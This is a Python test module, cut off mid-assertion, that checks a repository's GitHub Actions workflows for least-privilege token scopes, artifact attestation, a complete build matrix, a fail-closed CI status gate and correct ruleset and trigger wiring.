def test_only_the_release_job_holds_release_write_access(repo_root: Path) -> None:
    """Assert one job holds ``contents: write`` and it never checks out code.

    A ``contents: write`` token can rewrite tags, delete them, and edit or
    replace releases. It therefore belongs on the single job that actually
    publishes, and on nothing else in the file. The workflow-level block is
    asserted as ``contents: read`` rather than merely as "declares something",
    because a workflow-level grant is inherited by every job in the file --
    including a job added later whose behaviour nobody reviewed in the context
    of a grant that was already there. Starting every job from read and
    promoting exactly one is what keeps the blast radius of a compromise
    bounded to the publish step.

    The no-checkout assertion is the second half of the same property. A job
    holding a write token must never have untrusted code on its runner, and a
    checkout is how code arrives: it places a working tree there, and any
    subsequent build, install or test step executes it. The ``release`` job
    needs no working tree at all -- it downloads artifacts and hands them to the
    release action -- so there is nothing for a checkout to add.

    The writer set is compared for *equality* against exactly ``{release}``, so
    a second job gaining the scope fails exactly as a first job losing it does.
    A job declaring ``permissions: write-all`` is counted as a writer of every
    scope, since that is what the spelling grants.

    Args:
        repo_root: The repository root, used to locate ``cd.yml``.
    """
    path, data = _cd_workflow(repo_root)

    declared = _as_mapping(
        data.get("permissions"), f"workflow-level `permissions:` in {path.name}"
    )
    expected: dict[str, str] = {CONTENTS_SCOPE: CONTENTS_READ}
    assert dict(declared) == expected, (
        f"{path.name} declares workflow-level `permissions: {dict(declared)!r}`, "
        f"expected exactly {expected!r}. A workflow-level grant is inherited by "
        "every job in the file, so a scope named here is handed to a job added "
        "later that nobody reviewed in the context of a grant that was already "
        "there. `contents: write` in particular can rewrite tags and edit "
        "releases, and it is needed by exactly one job"
    )

    jobs = _workflow_jobs(data, path)
    writers = _scope_writers(jobs, CONTENTS_SCOPE)
    assert writers == {RELEASE_JOB: PERMISSION_WRITE}, (
        f"{path.name} grants {CONTENTS_SCOPE}: {PERMISSION_WRITE} to "
        f"{dict(writers)!r}, expected exactly {{{RELEASE_JOB!r}: "
        f"{PERMISSION_WRITE!r}}}"
    )

    release = jobs[RELEASE_JOB]
    steps = _job_steps(release)
    assert steps, (
        f"the {RELEASE_JOB!r} job in {path.name} declares no steps at all, so the "
        "no-checkout assertion below would pass by inspecting an empty list. A "
        "job that holds "
        f"{CONTENTS_SCOPE}: {PERMISSION_WRITE} and runs nothing is either a "
        "dead job or one whose steps were lost, and neither is a release gate"
    )
    checkouts = [
        f"step[{index}]"
        for index, step in enumerate(steps)
        if _references_action(_step_uses(step), CHECKOUT_ACTION)
    ]
    assert not checkouts, (
        f"the {RELEASE_JOB!r} job in {path.name} declares an "
        f"`{CHECKOUT_ACTION}` step at {checkouts}. That job holds "
        f"{CONTENTS_SCOPE}: {PERMISSION_WRITE}, so a checkout places a working "
        "tree on the one runner in this workflow that can rewrite tags and edit "
        "releases, and any build, install or test step after it executes what "
        "that tree contains. The job needs no working tree: it downloads the "
        "artifacts and hands them to the release action"
    )


def test_build_matrix_is_complete_and_the_smoke_test_is_real(
    repo_root: Path,
) -> None:
    """Assert all three platforms build, run, and are required to exist.

    A release artifact here is a frozen binary, so it is not portable between
    platforms and the matrix is not redundant coverage. An ``include`` list that
    dropped one runner would still produce a green build and a published
    release; the only symptom is a download link for that platform that is
    missing, which is discovered by whoever tries to install it. The three OS
    names are asserted as a set so a *fourth*, unreviewed runner is as much a
    failure as a missing one, and each entry must name its own ``asset``,
    because that name is what the attestation subject, the upload path, the
    smoke test and the released filename all interpolate.

    The smoke test has to be a *separate* step from the freeze. A build that
    only ran pyinstaller proves the freezer produced a file; it does not prove
    the file starts. The disjointness assertion is what stops a single step
    that does both from satisfying the contract, since only the step index can
    tell those two facts apart. It is a real check rather than a formality:
    without the ``if __name__ == "__main__":`` guard the onefile binary builds
    cleanly and exits without serving anything, and the repository's own
    ``tests/test_main.py`` already exercises that guard through runpy.

    ``if-no-files-found: error`` is the fail-closed spelling of the upload. The
    action's default is ``warn``, so a binary that was never produced uploads
    nothing, the build stays green, and the release ships with a platform
    silently absent. Asserting the literal rather than the key's presence is
    what makes the default an error.

    Args:
        repo_root: The repository root, used to locate ``cd.yml``.
    """
    path, data = _cd_workflow(repo_root)
    build = _require_job(data, path, BUILD_JOB)

    entries = _matrix_include(build, path, BUILD_JOB)
    systems = {str(entry.get("os")) for entry in entries}
    missing = sorted(REQUIRED_BUILD_OPERATING_SYSTEMS - systems)
    assert not missing, (
        f"the {BUILD_JOB!r} job in {path.name} builds on {sorted(systems)}, which "
        f"omits {missing}. The artifact is a frozen binary, so it is not "
        "portable between platforms and the matrix is not redundant coverage: a "
        "build that only ever ran on its own builder proves nothing about the "
        "platforms it skipped. The only symptom of the omission is a release "
        "with a download link for that platform leading nowhere"
    )

    nameless = sorted(
        str(entry.get("os"))
        for entry in entries
        if not str(entry.get("asset", "")).strip()
    )
    assert not nameless, (
        f"these {BUILD_JOB!r} matrix entries declare no `asset` name: {nameless}. "
        "That name is not decoration: the attestation subject, the upload path, "
        "the smoke-test command and the released filename all interpolate it, so "
        "an entry without one is an artifact the pipeline cannot name, run, "
        "attest or publish"
    )

    scripts = _step_scripts(build)
    freezers = {index for index, script in scripts if PYINSTALLER_COMMAND in script}
    assert freezers, (
        f"no step of the {BUILD_JOB!r} job in {path.name} invokes "
        f"{PYINSTALLER_COMMAND!r}, so nothing in this pipeline freezes a binary "
        "and the uploaded artifact is whatever happened to be on the runner"
    )
    smokers = {
        index
        for index, script in scripts
        if SMOKE_TEST_COMMAND in _effective_command(script)
    }
    assert smokers, (
        f"no step of the {BUILD_JOB!r} job in {path.name} executes "
        f"{SMOKE_TEST_COMMAND!r}, so the artifact is never started. A freezer "
        "exit code proves a file was produced, not that it runs: a onefile "
        "binary built from a module without the "
        '`if __name__ == "__main__":` guard builds cleanly and serves nothing'
    )
    assert not (freezers & smokers), (
        f"{sorted(freezers & smokers)} in the {BUILD_JOB!r} job in {path.name} "
        f"both invoke {PYINSTALLER_COMMAND!r} and execute "
        f"{SMOKE_TEST_COMMAND!r}. The two have to be separate steps, because a "
        "step that freezes and immediately runs the same invocation proves only "
        "that the command exited zero, not that the produced artifact starts"
    )

    uploads = _action_input_steps(build, UPLOAD_ARTIFACT_ACTION)
    assert uploads, (
        f"the {BUILD_JOB!r} job in {path.name} has no `{UPLOAD_ARTIFACT_ACTION}` "
        "step, so nothing is handed to the release job and the published release "
        "has no binaries attached"
    )
    lenient = [
        f"step[{index}] declares {dict(block)!r}"
        for index, block in uploads
        if block.get(IF_NO_FILES_FOUND_KEY) != IF_NO_FILES_FOUND_ERROR
    ]
    assert not lenient, (
        "artifact uploads that do not fail closed on a missing file:\n"
        + "\n".join(lenient)
        + f"\nEach must set `{IF_NO_FILES_FOUND_KEY}: "
        f"{IF_NO_FILES_FOUND_ERROR!r}`. The action's default is `warn`, so a "
        "binary that was never produced uploads nothing, the build stays green, "
        "and the release ships with that platform silently absent rather than "
        "failing"
    )


def test_release_artifacts_are_attested_to_their_commit(repo_root: Path) -> None:
    """Assert provenance is signed for each binary and the notes are generated.

    A downloadable binary that carries no attestation cannot be traced to the
    commit it was built from, which is the whole reason for publishing a frozen
    artifact rather than a source archive: the consumer's supply-chain question
    is not "what does this do" but "is this the thing the project said it
    built". ``actions/attest`` answers that with a Sigstore signature over the
    file's digest, bound to the workflow run and therefore to the commit. The
    subject path is asserted with both the ``dist/`` prefix and the per-OS
    ``matrix.asset`` name, because an attestation whose subject is a directory,
    a fixed filename, or a path built from the wrong variable signs something
    other than the file that gets uploaded -- and still looks like provenance in
    the Actions UI.

    The two OIDC-adjacent scopes are what make the signature possible.
    ``id-token: write`` is the token Sigstore exchanges for a signing
    certificate, and ``attestations: write`` is what publishes the signed
    bundle. Both omissions are silent: the run stays green and the release ships
    an unattached, unsigned binary, so the failure is invisible rather than
    reported.

    ``generate_release_notes: true`` belongs to the same "the release is only as
    good as what it declares" theme, one level down: the notes are what tell a
    consumer what changed, and a release published with an empty body is
    indistinguishable from one nobody wrote notes for.

    Args:
        repo_root: The repository root, used to locate ``cd.yml``.
    """
    path, data = _cd_workflow(repo_root)
    build = _require_job(data, path, BUILD_JOB)

    subjects = [
        str(block.get(SUBJECT_PATH_KEY, ""))
        for _index, block in _action_input_steps(build, ATTEST_ACTION)
    ]
    assert subjects, (
        f"the {BUILD_JOB!r} job in {path.name} has no `{ATTEST_ACTION}` step, so "
        "the binaries it uploads carry no provenance at all. An unattested "
        "downloadable binary cannot be traced to the commit it was built from, "
        "which is the entire reason to publish a frozen artifact rather than a "
        "source archive"
    )
    wrong = [
        subject
        for subject in subjects
        if DIST_PREFIX not in subject or MATRIX_ASSET_REFERENCE not in subject
    ]
    assert not wrong, (
        f"these `{ATTEST_ACTION}` steps in {path.name} declare a "
        f"{SUBJECT_PATH_KEY} of {wrong}, expected one addressing the per-OS "
        f"binary as {DIST_PREFIX}${{{{ {MATRIX_ASSET_REFERENCE} }}}}. A subject "
        "that is a directory, a fixed filename, or a path built from the wrong "
        "variable signs a digest other than the file that gets uploaded, while "
        "still rendering as a green attestation in the Actions UI"
    )

    granted = _as_mapping(
        build.get("permissions"),
        f"`permissions:` of the {BUILD_JOB!r} job in {path.name}",
    )
    missing = {
        scope: value
        for scope, value in REQUIRED_BUILD_JOB_PERMISSIONS.items()
        if granted.get(scope) != value
    }
    assert not missing, (
        f"the {BUILD_JOB!r} job in {path.name} declares "
        f"{dict(granted)!r}, which omits {missing}. `id-token: write` is the "
        "OIDC scope Sigstore's certificate exchange needs and `attestations: "
        "write` is what publishes the signed bundle. Both omissions are silent: "
        "the run stays green and the release ships an unsigned binary, so "
        "nothing reports the difference"
    )

    publishers = _action_input_steps(
        _require_job(data, path, RELEASE_JOB), GH_RELEASE_ACTION
    )
    assert publishers, (
        f"the {RELEASE_JOB!r} job in {path.name} does not use "
        f"{GH_RELEASE_ACTION!r}, so the artifacts the {BUILD_JOB!r} job produced "
        "are never attached to a release"
    )
    unnoted = [
        f"step[{index}] declares {dict(block)!r}"
        for index, block in publishers
        if not _yaml_true(block.get(GENERATE_RELEASE_NOTES_KEY))
    ]
    assert not unnoted, (
        "release publications without generated notes:\n"
        + "\n".join(unnoted)
        + f"\nEach must set `{GENERATE_RELEASE_NOTES_KEY}: true` so GitHub "
        "derives the notes from the merged pull requests. A release published "
        "with an empty body is indistinguishable from one nobody wrote notes "
        "for, so the omission is not a style preference"
    )


def test_ci_status_gate_requires_provenance_for_a_skipped_job(
    repo_root: Path,
) -> None:
    """Assert the ``CI Status`` gate's fail-closed allow() is present and exact.

    This is the mechanism the whole single-required-check design rests on.
    GitHub reports a *skipped* job as a successful required check, and a
    cancelled run leaves every job that never started reported as "skipped"
    rather than "cancelled" (github.com/actions/runner#3041). The
    ``ci-status-checker`` job's own ``allow()`` helper exists to close exactly
    that: a skipped result passes only when the path filter explicitly reported
    ``false``, which is the one provenance value that means "this job did not
    apply". Everything else fails, and the job then exits non-zero.

    So the clause under test is currently the only thing standing between a
    cancelled run and a bad merge, and the failure is silent by construction --
    the gate passes. The assertion is on the exact three lines rather than on
    "contains a provenance check", because ``[ "$2" = skipped ] && return 0``
    is the same gate with that clause deleted, and it is a shorter edit to make
    by accident than by intent. A fourth ``[ ...`` line is rejected for the
    same reason: a function that both grants and withholds the same exemption
    is unreadable, and whichever line the shell reaches first wins silently.

    Args:
        repo_root: The repository root, used to locate ``ci.yml``.
    """
    path = repo_root / WORKFLOWS_DIR / CI_WORKFLOW_FILE
    assert path.is_file(), f"required gating file is missing: {path}"

    job = _require_job(_load_workflow(path), path, CI_STATUS_JOB_ID)
    carriers = [
        script
        for _index, script in _step_scripts(job)
        if f"{ALLOW_FUNCTION_NAME}()" in script
    ]
    assert len(carriers) == 1, (
        f"expected exactly one step of the {CI_STATUS_JOB_ID!r} job in "
        f"{path.name} to define {ALLOW_FUNCTION_NAME}(), found {len(carriers)}. "
        "The provenance rule under test lives in that function, so zero means "
        "the policy is absent rather than satisfied, and more than one means "
        "which of them the gate actually runs is not determined by this file"
    )

    lines = _executable_lines(_shell_function_body(carriers[0], ALLOW_FUNCTION_NAME))
    missing = sorted(REQUIRED_ALLOW_LINES - set(lines))
    assert not missing, (
        f"{ALLOW_FUNCTION_NAME}() in the {CI_STATUS_JOB_ID!r} job of {path.name} "
        f"is missing {missing}; it is {lines!r}. A *skipped* result counts as a "
        "successful required check in GitHub, and a cancelled run reports every "
        "never-started job as skipped, so without the "
        '`[ "$1" = false ]` provenance term on the skipped line a cancelled '
        "run passes this gate and broken code merges. Without the `return 1` "
        "deny line, an unrecognised result falls through as a pass"
    )

    unrecognised = sorted(
        {line for line in lines if line.startswith("[")} - REQUIRED_ALLOW_LINES
    )
    assert not unrecognised, (
        f"{ALLOW_FUNCTION_NAME}() in the {CI_STATUS_JOB_ID!r} job of {path.name} "
        f"contains shell test line(s) {unrecognised} that are not among "
        f"{sorted(REQUIRED_ALLOW_LINES)}. Each test in this function has to be "
        "one of the three the gate is specified in terms of, because a second "
        "one can only either duplicate an exemption or quietly widen the set of "
        "results that pass, and the shell honours whichever it reaches first "
        "without saying so"
    )


def test_a_scheduled_workflow_never_uses_a_bare_cancel_in_progress(
    repo_root: Path,
) -> None:
    """Assert every scheduled workflow's ``cancel-in-progress`` is conditional.

    ``cancel-in-progress`` is evaluated on the *arriving* run, not the one
    already queued. The bare boolean ``true`` therefore does not mean "cancel
    superseded runs of the same kind" -- it means "whenever anything new enters
    this group, cancel whatever is there". A scheduled security scan sharing a
    concurrency group with ordinary pushes is therefore killed by the next
    push, and the kill is indistinguishable from any other cancellation: a
    security scan that silently never completes is worse than one that fails,
    because a failure at least appears in the Security tab.

    The rule is deliberately scoped to workflows that declare a ``schedule``
    trigger. ``ci.yml`` keys its group on ``head_ref || run_id`` and pins the
    bare boolean, which is correct there and would be a false positive under a
    repo-wide reading: on a tag or main push, nothing else can arrive in the
    same group, so a bare ``true`` costs nothing. A scheduled run is the
    opposite case, and only the presence of a schedule makes the distinction
    matter.

    Args:
        repo_root: The repository root, used to locate ``.github/workflows``.
    """
    offenders: list[str] = []
    scheduled: list[str] = []
    for path in _workflow_paths(repo_root):
        data = _load_workflow(path)
        if SCHEDULE_LITERAL not in _trigger_keys(data):
            continue
        relative = str(path.relative_to(repo_root))
        scheduled.append(relative)
        concurrency = _as_mapping(
            data.get("concurrency"), f"`concurrency:` in {relative}"
        )
        cancel = concurrency.get(CANCEL_IN_PROGRESS_KEY)
        if _yaml_true(cancel):
            offenders.append(
                f"{relative}: {CANCEL_IN_PROGRESS_KEY} is {cancel!r} "
                f"({type(cancel).__name__})"
            )

    assert scheduled, (
        f"no workflow under {WORKFLOWS_DIR} declares a `{SCHEDULE_LITERAL}:` "
        "trigger, so this scan is inspecting nothing. A weekly security scan is "
        "the only thing that surfaces findings from newly released rules against "
        "a codebase nobody is currently changing, and its cancellation policy is "
        "the part that is easy to get wrong"
    )
    assert not offenders, (
        "these scheduled workflows use a bare boolean "
        f"`{CANCEL_IN_PROGRESS_KEY}`:\n" + "\n".join(offenders) + "\n"
        f"`{CANCEL_IN_PROGRESS_KEY}` is evaluated on the *arriving* run, so the "
        "bare boolean cancels the scheduled run itself the moment any other run "
        "joins the group. Use a string expression that excludes the schedule "
        f"event, e.g. `${{{{ {EVENT_NAME_REFERENCE} != '{SCHEDULE_LITERAL}' }}}}`"
    )


def _bash() -> str:
    """Locate a bash interpreter able to run ``scripts/apply_ruleset.sh``.

    The script declares ``#!/usr/bin/env bash`` and requires it: it sets
    ``-o pipefail``, which dash rejects, so invoking it through ``/bin/sh``
    fails on Debian/Ubuntu with "set: Illegal option -o pipefail" and exit 2.
    Hardcoding an interpreter here would reintroduce that on whichever platform
    the guess was wrong for, so the interpreter is resolved instead -- from
    PATH first, then from the Git-for-Windows location, since the Windows
    matrix cell has no system bash.

    Returns:
        A path to a bash executable.

    Raises:
        AssertionError: If no bash can be found, with the paths that were tried.
    """
    candidates = [
        shutil.which("bash"),
        r"C:\Program Files\Git\bin\bash.exe",
        r"C:\Program Files\Git\usr\bin\bash.exe",
    ]
    for candidate in candidates:
        if candidate and Path(candidate).is_file():
            return candidate
    tried = [c for c in candidates if c]
    message = (
        "no bash interpreter found, so the ruleset script cannot be exercised. "
        f"Tried: {tried}. Install bash, or point the Windows matrix cell at "
        "Git for Windows"
    )
    raise AssertionError(message)


def test_no_recipe_forces_sh_on_a_script_that_needs_another_shell(
    repo_root: Path,
) -> None:
    """Assert no Makefile recipe runs a bash-only script through ``sh``.

    ``scripts/apply_ruleset.sh`` declares ``#!/usr/bin/env bash`` and sets
    ``-o pipefail``. ``sh`` is bash on macOS and dash on Debian/Ubuntu, and
    dash has no ``pipefail``, so a recipe written as ``sh
    scripts/apply_ruleset.sh`` fails on every Linux developer machine with
    ``set: Illegal option -o pipefail`` and exit 2 -- while passing on macOS.

    That asymmetry is what makes it worth a gate. It surfaced only because a
    test invoked the script through ``/bin/sh`` on the CI matrix, where
    ``/bin/sh`` is dash; nothing about the script changed when the failure
    appeared. The fix is to execute the file so its shebang is honoured, and
    this assertion is what keeps the forcing form from coming back.
    """
    makefile = repo_root / MAKEFILE
    assert makefile.is_file(), f"required gating file is missing: {makefile}"
    bash_scripts = {
        path.relative_to(repo_root)
        for path in (repo_root / "scripts").rglob("*")
        if path.is_file() and path.read_text(encoding="utf-8").startswith("#!")
    }
    assert bash_scripts, (
        "expected at least one shebanged script under scripts/, so this "
        "assertion has something to check. If the last one was removed, this "
        "test is vacuous and should be deleted rather than left passing"
    )

    offenders: list[str] = []
    for number, line in enumerate(
        makefile.read_text(encoding="utf-8").splitlines(), start=1
    ):
        # A make recipe line may carry the silent `@`, `+` or `-` prefix, and
        # a variable-expanded command may not start with a literal at all.
        # Matching only a bare `sh ` prefix would make this assertion vacuous
        # against the exact form it exists to catch, which is what happened the
        # first time it was written.
        stripped = line.strip().lstrip("@+-").strip()
        if not stripped.startswith(("sh ", "/bin/sh ", "./sh ")):
            continue
        offenders.extend(
            f"Makefile:{number}: {stripped}  (shebang of {script} is "
            f"{script.read_text(encoding='utf-8').splitlines()[0]})"
            for script in sorted(bash_scripts)
            if script.name in stripped
        )
    assert not offenders, (
        "these recipes force `sh` on a script that declares a different "
        "interpreter:\n"
        + "\n".join(offenders)
        + "\nExecute the script directly instead, so its shebang applies. "
        "`sh` is dash on Debian/Ubuntu and bash on macOS, so a recipe that "
        "works on a maintainer's laptop can fail on CI and on Linux with no "
        "change to the script at all"
    )


def test_ruleset_payload_name_is_derived_from_the_lookup_variable(
    repo_root: Path,
) -> None:
    """Assert the POSTed name and the looked-up name are one value.

    ``RULESET_NAME`` drives the lookup that decides create-versus-update, and
    the payload carries the name the API will store. When those were two
    separate sources -- a variable and a hardcoded literal -- a mistyped
    variable made the lookup miss, selected the create path, and POSTed the
    literal. The result is not a visible error: the repository ends up with a
    second ruleset carrying the canonical name, and the one the author thought
    they were updating is stale. ``make ruleset`` reports success either way.

    This runs the script rather than reading it, because the defect lives in
    the wiring between two places in the file, and a source-level assertion
    would still pass if ``payload()`` stopped consulting the variable.
    """
    script = repo_root / RULESET_SCRIPT
    for name in (
        "Default Branch Ruleset",
        "typo-ruleset",
        'quoted " name',
        "back\\slash name",
        "unicode ✅ 名前",
    ):
        result = subprocess.run(  # ruff: ignore[subprocess-without-shell-equals-true]
            [_bash(), str(script), "--print"],
            capture_output=True,
            # `text=True` alone decodes with the LOCALE encoding, which is
            # charmap on the Windows runner and raises UnicodeDecodeError on
            # the non-ASCII names below -- before the assertion under test ever
            # runs. Pin UTF-8 so this test checks the payload and not the
            # runner's code page.
            encoding="utf-8",
            # GITHUB_REPOSITORY is set so resolve_repo does not depend on the
            # checkout having an `origin` remote: a source tarball or a vendor
            # copy has none, and this assertion is about the payload name, not
            # about how the repository is discovered.
            env={**os.environ, "RULESET_NAME": name, "GITHUB_REPOSITORY": "o/r"},
            check=True,
        )
        assert result.stdout is not None, (
            "the ruleset script produced no stdout, so there is no payload to "
            f"assert on (stderr: {result.stderr!r})"
        )
        lines = result.stdout.splitlines()
        body = "\n".join(line for line in lines if not line.startswith("#"))
        payload = _as_mapping(
            json.loads(body), f"the ruleset payload for RULESET_NAME={name!r}"
        )
        assert payload.get(NAME_KEY) == name, (
            f"with RULESET_NAME={name!r} the payload names "
            f"{payload.get(NAME_KEY)!r}. The lookup selects create-versus-update "
            "with this variable while the payload supplies the stored name; if "
            "they disagree, a mistyped value silently creates a duplicate "
            "ruleset instead of failing. Both must read the same variable"
        )


def test_every_required_ruleset_context_is_a_context_this_repo_emits(
    repo_root: Path,
) -> None:
    """Assert each ruleset context is ``CI Status`` and is actually produced.

    A required status check names a string GitHub publishes as a check run. A
    context nothing ever publishes can never be satisfied, so the ruleset
    blocks every merge from the moment it is applied until somebody notices and
    edits it -- and the pressure to notice arrives only when a merge is
    blocked, which is the worst possible time to be reading a ruleset.

    The failure this guards against is specific. CodeQL's check contexts are the
    matrix-expanded job names ``Analyze (python)`` and ``Analyze (actions)``,
    never a context called ``CodeQL``, so requiring one is unsatisfiable by
    construction. The reference repository ``iamwatchdogs/learning-hog`` does
    require exactly that and carries the same latent defect; CodeQL is gated
    here by the ruleset's ``code_scanning`` rule instead, which is a merge
    condition rather than a check context. So the assertion is not "no
    interesting context may ever be required" -- it is that every context listed
    is one a job in this repository is named.

    Args:
        repo_root: The repository root, used to locate the ruleset script and
            ``.github/workflows``.
    """
    contexts = _ruleset_required_status_checks(_ruleset_payload(repo_root))
    assert contexts, (
        f"{RULESET_SCRIPT} declares no "
        f"{RULE_STATUS_CHECK_TYPE!r} entry, so it gates merges on nothing at "
        "all. The ruleset is the only thing making the CI gate mandatory: a "
        "workflow can succeed perfectly and still be merged over"
    )

    unexpected = sorted(set(contexts) - {REQUIRED_STATUS_CHECK_NAME})
    assert not unexpected, (
        f"{RULESET_SCRIPT} requires status-check context(s) {unexpected}, but "
        f"this repository only emits {REQUIRED_STATUS_CHECK_NAME!r}. A required "
        "context that no job ever publishes is unsatisfiable, so the ruleset "
        "blocks every merge until it is edited under pressure. A per-job check "
        "name cannot be required here either: path filtering legitimately skips "
        "jobs, and GitHub counts a skipped required check as success, which is "
        "the bypass the single fail-closed gate exists to prevent"
    )

    emitted = [
        f"{path.relative_to(repo_root)}::{job_id}"
        for path in _workflow_names(repo_root)
        for job_id, name in _job_display_names(_load_workflow(path), path)
        if name == REQUIRED_STATUS_CHECK_NAME
    ]
    assert len(emitted) == 1, (
        f"expected exactly one job in {WORKFLOWS_DIR} to be named "
        f"{REQUIRED_STATUS_CHECK_NAME!r}, found {emitted}. The ruleset names "
        "that exact string, so a second job with the same display name makes the "
        "required check ambiguous -- GitHub accepts a check run from either one"
    )

    assert CODEQL_UNSATISFIABLE_CONTEXT not in contexts, (
        f"{RULESET_SCRIPT} requires a context named "
        f"{CODEQL_UNSATISFIABLE_CONTEXT!r}, which no job in this repository can "
        "ever publish"
    )
    codeql_path = repo_root / WORKFLOWS_DIR / CODEQL_WORKFLOW_FILE
    assert codeql_path.is_file(), f"required gating file is missing: {codeql_path}"
    codeql_jobs = _job_display_names(_load_workflow(codeql_path), codeql_path)
    assert codeql_jobs, (
        f"{CODEQL_WORKFLOW_FILE} declares no jobs, so there is no job name to "
        f"compare the {CODEQL_UNSATISFIABLE_CONTEXT!r} context against"
    )
    misnamed = [
        f"{job_id}: {name!r}"
        for job_id, name in codeql_jobs
        if not CODEQL_ANALYZE_JOB_NAME_RE.fullmatch(name)
    ]
    assert not misnamed, (
        "these CodeQL jobs are not named `Analyze (...)`: "
        f"{misnamed}. CodeQL's check contexts are the matrix-expanded job names, "
        "so the only contexts this file publishes are the per-language ones, and "
        "a job renamed away from that shape changes what a ruleset can require. "
        "The matrix is what makes one job publish two differently named checks; "
        "a generically named job publishes one context per cell and nothing in "
        "the ruleset refers to any of them"
    )


def test_every_workflow_run_filter_names_a_workflow_that_exists(
    repo_root: Path,
) -> None:
    """Assert each ``workflow_run`` filter matches a declared workflow name.

    A ``workflow_run`` filter matches on a workflow's ``name:``, not on its
    filename. That is a silent contract in three places at once -- the filter
    in the dependent workflow, the ``name:`` of the upstream workflow, and
    nothing else -- so a rename on either side simply stops the dependent jobs
    from ever running again. There is no error anywhere: the workflow is
    syntactically valid, the upstream workflow runs on schedule, and the
    dependent workflow's run does not appear in the Actions UI at all. The
    failure is discovered when somebody goes looking for the result the missing
    job was supposed to produce.

    The filter is therefore checked against the *declared names* of every
    workflow in the directory rather than against the set of files, which is
    the same reason the check cannot be satisfied by pointing at a file that
    happens to exist.

    Args:
        repo_root: The repository root, used to locate ``.github/workflows``.
    """
    declared = {name for name in _workflow_names(repo_root).values() if name}
    waiting: list[str] = []
    unknown: list[str] = []
    for path in _workflow_paths(repo_root):
        data = _load_workflow(path)
        block = _trigger_block(data, WORKFLOW_RUN_TRIGGER)
        if block is None:
            continue
        relative = str(path.relative_to(repo_root))
        waiting.append(relative)
        mapping = _as_mapping(
            block, f"the `{WORKFLOW_RUN_TRIGGER}:` trigger in {relative}"
        )
        wanted = mapping.get("workflows")
        assert isinstance(wanted, list), (
            f"{relative} declares `{WORKFLOW_RUN_TRIGGER}:` with "
            f"`workflows: {wanted!r}` ({type(wanted).__name__}), expected a list "
            f"of workflow names. A filter naming nothing matches every completed "
            "run of every workflow"
        )
        assert wanted, (
            f"{relative} declares `{WORKFLOW_RUN_TRIGGER}:` with an empty "
            f"`workflows:` list, so its dependent jobs fire far more often than "
            "intended rather than not at all"
        )
        unknown.extend(
            f"{relative} waits for {str(entry)!r}"
            for entry in wanted
            if str(entry) not in declared
        )

    assert waiting, (
        f"no workflow under {WORKFLOWS_DIR} declares a "
        f"`{WORKFLOW_RUN_TRIGGER}:` trigger, so this scan is inspecting nothing. "
        "Assigning unassigned code-scanning alerts is the work such a job exists "
        "to do, and it has no other trigger that fires after CodeQL finishes"
    )
    assert not unknown, (
        "these filters name the `name:` of no workflow in the directory:\n"
        + "\n".join(unknown)
        + f"\nA `{WORKFLOW_RUN_TRIGGER}` filter matches on a workflow's NAME, not "
        "its filename, so an upstream rename -- or a filter written against the "
        "file rather than the name -- stops the dependent job from ever running "
        "again. The dependent run then does not appear in the Actions UI at all, "
        "and the upstream workflow still runs on schedule, so nothing reports it"
    )


def test_privileged_jobs_hold_no_scope_beyond_what_they_use(
    repo_root: Path,
) -> None:
    """Assert the privileged jobs' grants match their use, with nothing extra.

    The existing permission contracts are subset checks: they assert that a
    required scope is *present*, which is the right check for a missing grant
    and precisely the wrong check for an extra one. So nothing in the suite
    notices a fourth scope added "while I was in here" -- the job still grants
    everything it needs, the diff reads as a one-line addition, and the token is
    quietly wider than the workflow's stated purpose.

    That matters most in ``default-assignee.yml``, which runs on both
    ``pull_request_target`` and ``workflow_run``: a ``contents: write`` added
    there is a push-capable token against a privileged trigger, with no visible
    symptom, on a workflow whose whole safety argument is that it runs no
    untrusted code. ``contents: write`` there can rewrite the default branch.
    The grants are therefore asserted as exact sets, and the assignment job --
    which calls exactly one ``gh api`` endpoint, served by the issues API -- is
    held to a subset so that a legitimate future scope is a deliberate edit.

    Args:
        repo_root: The repository root, used to locate ``.github/workflows``.
    """
    auto_merge_path, auto_merge_data = _auto_merge_workflow(repo_root)
    auto_merge_job = _require_job(auto_merge_data, auto_merge_path, AUTO_MERGE_JOB_ID)
    auto_merge_granted = _as_mapping(
        auto_merge_job.get("permissions"),
        f"`permissions:` of the {AUTO_MERGE_JOB_ID!r} job in {auto_merge_path.name}",
    )
    assert dict(auto_merge_granted) == EXACT_AUTO_MERGE_JOB_PERMISSIONS, (
        f"the {AUTO_MERGE_JOB_ID!r} job in {auto_merge_path.name} declares "
        f"{dict(auto_merge_granted)!r}, expected exactly "
        f"{EXACT_AUTO_MERGE_JOB_PERMISSIONS!r}. This job runs on "
        "`pull_request_target` holding a write token against the base "
        "repository, so every extra scope is extra authority for whoever "
        "reaches the job. `issues: write` is required because labels are served "
        "by the issues API; nothing beyond the three listed has a caller in this "
        "workflow"
    )

    assignee_path = repo_root / WORKFLOWS_DIR / DEFAULT_ASSIGNEE_WORKFLOW_FILE
    assert assignee_path.is_file(), f"required gating file is missing: {assignee_path}"
    assignee_data = _load_workflow(assignee_path)
    new_work = _require_job(assignee_data, assignee_path, ASSIGN_NEW_WORK_JOB_ID)
    new_work_granted = _as_mapping(
        new_work.get("permissions"),
        f"`permissions:` of the {ASSIGN_NEW_WORK_JOB_ID!r} job in {assignee_path.name}",
    )
    declared_scopes = {
        str(scope): str(level) for scope, level in new_work_granted.items()
    }
    assert declared_scopes != {CONTENTS_SCOPE: PERMISSION_WRITE}, (
        f"the {ASSIGN_NEW_WORK_JOB_ID!r} job in {assignee_path.name} holds "
        f"{CONTENTS_SCOPE}: {PERMISSION_WRITE}. That file runs on both "
        "`pull_request_target` and `workflow_run`, so this would be a "
        "push-capable token against a privileged trigger. The job assigns one "
        "user through one `gh api` call to an endpoint the issues API serves, "
        "which needs no repository write at all"
    )
    excess = {
        scope: level
        for scope, level in declared_scopes.items()
        if ALLOWED_ASSIGN_NEW_WORK_PERMISSIONS.get(scope) != level
    }
    assert not excess, (
        f"the {ASSIGN_NEW_WORK_JOB_ID!r} job in {assignee_path.name} declares "
        f"{excess} beyond {ALLOWED_ASSIGN_NEW_WORK_PERMISSIONS!r} (it declares "
        f"{declared_scopes!r}). The job's whole purpose is a single assignees "
        "call, so a scope it does not use is authority nobody has to exploit to "
        "abuse"
    )

    alerts = _require_job(assignee_data, assignee_path, ASSIGN_ALERTS_JOB_ID)
    alerts_granted = _as_mapping(
        alerts.get("permissions"),
        f"`permissions:` of the {ASSIGN_ALERTS_JOB_ID!r} job in {assignee_path.name}",
    )
    assert dict(alerts_granted) == EXACT_ALERT_JOB_PERMISSIONS, (
        f"the {ASSIGN_ALERTS_JOB_ID!r} job in {assignee_path.name} declares "
